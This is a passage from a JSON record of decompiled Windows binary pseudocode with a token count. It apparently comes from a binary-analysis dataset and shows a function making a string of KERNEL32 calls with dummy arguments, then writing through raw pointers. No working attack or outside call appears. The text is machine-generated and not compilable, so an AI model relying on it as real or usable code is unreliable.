puStack36 = 0x404d57;\n        (*_sym.imp.KERNEL32.dll_GetTempPathW)();\n        puStack36 = &fcn.00404d0c::lpNumberOfEventsRead;\n        uStack40 = 0;\n        puStack44 = &fcn.00404d0c::var_18h;\n        uStack48 = 0;\n        uStack52 = 0x404d67;\n        (*_sym.imp.KERNEL32.dll_ReadConsoleInputA)();\n        uStack52 = 0;\n        uStack56 = 0;\n        uStack60 = 0;\n        uStack64 = 0x404d70;\n        (*_sym.imp.KERNEL32.dll_CreateDirectoryExW)();\n        uStack64 = 0;\n        uStack68 = 0x404d77;\n        (*_sym.imp.KERNEL32.dll_GetModuleHandleW)();\n        uStack68 = 0;\n        uStack72 = 0;\n        puStack76 = &fcn.00404d0c::var_1818h;\n        uStack80 = 0;\n        uStack84 = 0x404d87;\n        (*_sym.imp.KERNEL32.dll_GetConsoleAliasW)();\n    }\n    *(*0xaa6e40 + arg_8h) = *(*0xaa76a8 + 0x38d6 + arg_8h);\n    return;\n}\n",
        "token_count": 675
    }
}